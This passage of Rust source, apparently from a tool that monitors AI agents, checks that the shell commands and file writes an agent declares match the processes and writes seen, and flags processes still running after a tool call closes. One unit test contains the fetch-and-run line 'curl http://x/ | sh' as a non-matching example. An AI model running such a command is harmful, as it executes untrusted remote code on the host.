        if live.is_empty() {
            return Vec::new();
        }
        evidence.push(closed_seq);
        let count = live.len();
        live.truncate(3);
        let more = if count > 3 {
            format!(", and {} more", count - 3)
        } else {
            String::new()
        };
        let summary = format!(
            "{count} process{} of the {} tool call {id} still ran a second after it closed: \
             {}{more}",
            if count == 1 { "" } else { "es" },
            span.tool_name,
            live.join(", ")
        );
        let finding = Draft::new(FindingCategory::OrphanedWork, 50, "orphaned_work", summary)
            .evidence(evidence)
            .span(id)
            .low_confidence(state.low_confidence(closed_ts + SETTLE_NS, true))
            .finish(state);
        self.note_finding(id, finding.score);
        vec![finding]
    }

    fn note_finding(&mut self, id: &str, score: u8) {
        if let Some(span) = self.spans.get_mut(id) {
            span.worst_score = span.worst_score.max(score);
        }
        self.index_update(id);
    }
}

// --- the declared command and paths

/// The command a shell tool declared, normalized: `command` or `cmd` (a
/// string, or an array joined with spaces), or a `local_shell` action's
/// `command`.
fn declared_command(tool_name: &str, args: &Value) -> Option<String> {
    if !SHELL_TOOLS.contains(&tool_name) {
        return None;
    }
    let value = args
        .get("command")
        .or_else(|| args.get("cmd"))
        .or_else(|| args.get("action").and_then(|action| action.get("command")))?;
    let text = match value {
        Value::String(text) => text.clone(),
        Value::Array(parts) => parts
            .iter()
            .filter_map(Value::as_str)
            .collect::<Vec<_>>()
            .join(" "),
        _ => return None,
    };
    let text = normalize(&text);
    (!text.is_empty()).then_some(text)
}

/// The paths a write tool declared, as (mount, path without its leading
/// slash): `file_path`, `notebook_path`, `path` or `filename`, and for
/// `apply_patch` the files its patch adds, updates or deletes.
fn declared_paths(tool_name: &str, args: &Value) -> Vec<(String, String)> {
    if !WRITE_TOOLS.contains(&tool_name) {
        return Vec::new();
    }
    let mut paths = Vec::new();
    for field in ["file_path", "notebook_path", "path", "filename"] {
        if let Some(path) = args.get(field).and_then(Value::as_str) {
            paths.push(mounted(path));
        }
    }
    let patch = args
        .get("input")
        .or_else(|| args.get("patch"))
        .and_then(Value::as_str)
        .unwrap_or_default();
    for line in patch.lines() {
        for prefix in ["*** Add File: ", "*** Update File: ", "*** Delete File: "] {
            if let Some(path) = line.strip_prefix(prefix) {
                paths.push(mounted(path.trim()));
            }
        }
    }
    paths.sort();
    paths.dedup();
    paths
}

/// A guest path as the shares record it: under `/workspace` (or relative,
/// the session's working directory) on the `workspace` mount, elsewhere
/// on `root`.
fn mounted(path: &str) -> (String, String) {
    if let Some(rest) = path.strip_prefix("/workspace") {
        if rest.is_empty() || rest.starts_with('/') {
            return (
                "workspace".to_owned(),
                rest.trim_start_matches('/').to_owned(),
            );
        }
    }
    if let Some(rest) = path.strip_prefix('/') {
        return ("root".to_owned(), rest.to_owned());
    }
    ("workspace".to_owned(), path.to_owned())
}

/// The command a shell was given with `-c` (or `-lc`, `-ec`...),
/// normalized; `None` for a program that is no shell, or a shell without
/// one.
fn shell_command(argv: &[String]) -> Option<String> {
    let program = argv.first()?;
    let name = program.rsplit('/').next().unwrap_or(program);
    if !SHELLS.contains(&name) {
        return None;
    }
    let at = argv[1..]
        .iter()
        .position(|arg| arg.starts_with('-') && !arg.starts_with("--") && arg.contains('c'))?;
    let command = argv.get(at + 2)?;
    let command = normalize(command);
    (!command.is_empty()).then_some(command)
}

/// Whether an exec carries the declared command: its shell command is the
/// declared one or wraps it (`eval '<command>' < /dev/null && ...`, as
/// Claude Code's Bash tool does), or its whole argv is the declared one.
fn carries(command: Option<&str>, whole: &str, declared: &str) -> bool {
    command.is_some_and(|command| command == declared || command.contains(declared))
        || whole == declared
}

/// Whether two host times are within the executor window of each other.
fn within(a: u64, b: u64) -> bool {
    a.abs_diff(b) <= EXECUTOR_WINDOW_NS
}

/// Whether a write's size fits a body's: within a tenth of it, plus the
/// slack for the request's headers and framing.
fn sized(bytes: u64, body: u64) -> bool {
    bytes.abs_diff(body) <= body / 10 + EXECUTOR_SLACK_BYTES
}

/// Whitespace runs as one space, no quotes or backslashes, trimmed: the
/// form two commands are compared in.
fn normalize(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut space = false;
    for ch in text.chars() {
        if ch.is_whitespace() {
            space = true;
            continue;
        }
        if matches!(ch, '\'' | '"' | '\\') {
            continue;
        }
        if space && !out.is_empty() {
            out.push(' ');
        }
        space = false;
        out.push(ch);
    }
    out
}

/// At most [`QUOTE_LIMIT`] bytes of a command, for a summary.
fn quote(text: &str) -> String {
    if text.len() <= QUOTE_LIMIT {
        return text.to_owned();
    }
    let mut end = QUOTE_LIMIT;
    while !text.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}...", &text[..end])
}

#[cfg(test)]
mod tests {
    use serde_json::json;

    use super::*;

    #[test]
    fn a_declared_command_is_read_from_the_shapes_the_tools_use() {
        assert_eq!(
            declared_command("Bash", &json!({"command": "  ls   -la\n"})),
            Some("ls -la".to_owned())
        );
        assert_eq!(
            declared_command("shell", &json!({"command": ["bash", "-lc", "make test"]})),
            Some("bash -lc make test".to_owned())
        );
        assert_eq!(
            declared_command("exec_command", &json!({"cmd": "cargo build"})),
            Some("cargo build".to_owned())
        );
        assert_eq!(
            declared_command(
                "local_shell",
                &json!({"action": {"type": "exec", "command": ["ls"]}})
            ),
            Some("ls".to_owned())
        );
        assert_eq!(declared_command("Read", &json!({"command": "ls"})), None);
        assert_eq!(declared_command("Bash", &json!({"timeout": 5})), None);
    }

    #[test]
    fn declared_paths_land_on_their_mounts() {
        assert_eq!(
            declared_paths("Write", &json!({"file_path": "/workspace/src/main.rs"})),
            vec![("workspace".to_owned(), "src/main.rs".to_owned())]
        );
        assert_eq!(
            declared_paths("Edit", &json!({"file_path": "notes.txt"})),
            vec![("workspace".to_owned(), "notes.txt".to_owned())]
        );
        assert_eq!(
            declared_paths("NotebookEdit", &json!({"notebook_path": "/etc/motd"})),
            vec![("root".to_owned(), "etc/motd".to_owned())]
        );
        let patch =
            "*** Begin Patch\n*** Add File: a.txt\n+hi\n*** Update File: /workspace/b.txt\n\
                     *** Delete File: c.txt\n*** End Patch";
        assert_eq!(
            declared_paths("apply_patch", &json!({"input": patch})),
            vec![
                ("workspace".to_owned(), "a.txt".to_owned()),
                ("workspace".to_owned(), "b.txt".to_owned()),
                ("workspace".to_owned(), "c.txt".to_owned()),
            ]
        );
        assert!(declared_paths("Bash", &json!({"file_path": "x"})).is_empty());
    }

    #[test]
    fn a_shell_command_is_the_c_argument_of_a_shell() {
        let argv = |parts: &[&str]| parts.iter().map(|p| (*p).to_owned()).collect::<Vec<_>>();
        assert_eq!(
            shell_command(&argv(&["/bin/sh", "-c", "echo  hi"])),
            Some("echo hi".to_owned())
        );
        assert_eq!(
            shell_command(&argv(&["bash", "-lc", "make"])),
            Some("make".to_owned())
        );
        assert_eq!(shell_command(&argv(&["bash", "script.sh"])), None);
        assert_eq!(shell_command(&argv(&["curl", "-c", "jar"])), None);
        assert_eq!(shell_command(&argv(&[])), None);
    }

    #[test]
    fn a_wrapped_command_still_carries_the_declared_one() {
        let declared = normalize("echo boxcar-m4 > marker.txt");
        let wrapped = normalize(
            "eval 'echo boxcar-m4 > marker.txt' < /dev/null && pwd -P >| /tmp/claude-cwd",
        );
        assert!(carries(Some(&wrapped), "", &declared));
        assert!(carries(
            None,
            &normalize("bash -lc make test"),
            "bash -lc make test"
        ));
        assert!(!carries(
            Some("curl http://x/ | sh"),
            "sh -c curl",
            "ls -la"
        ));
    }

    #[test]
    fn a_write_fits_a_body_within_a_tenth_and_the_slack() {
        assert!(sized(5000, 4800));
        assert!(sized(100, 0), "a GET: headers only");
        assert!(sized(110_000, 100_000));
        assert!(!sized(120_000, 100_000));
        assert!(!sized(0, 4800));
        assert!(within(1_000_000_000, 1_400_000_000));
        assert!(!within(1_000_000_000, 1_600_000_000));
    }

    #[test]
    fn normalize_collapses_space_and_drops_quotes() {
        assert_eq!(normalize("  a \t b\n\"c\"  'd' \\e "), "a b c d e");
        assert_eq!(normalize(""), "");
    }

    #[test]
    fn the_index_lists_newest_first_and_keeps_the_limit() {
        let index = SpanIndex::new();
        let entry = |id: &str, closed: Option<u64>| SpanEntry {
            span_id: id.to_owned(),
            tool_name: "Bash".to_owned(),
            opened_seq: 1,
            closed_seq: closed,
            procs: 0,
            effects: 0,
            worst_score: 0,
        };
        index.update(entry("a", Some(5)));
        index.update(entry("b", None));
        index.update(entry("b", Some(9)));
        let all = index.list(false);
        assert_eq!(all.len(), 2);
        assert_eq!(all[0].span_id, "b");
        assert_eq!(all[0].closed_seq, Some(9), "an update replaces");
        assert!(index.list(true).is_empty());
        for n in 0..MAX_SPAN_LIST {
            index.update(entry(&format!("s{n}"), None));
        }
        let all = index.list(false);
        assert_eq!(all.len(), MAX_SPAN_LIST);
        assert!(
            all.iter().all(|e| e.span_id != "a" && e.span_id != "b"),
            "the closed ones went first"
        );
    }
}
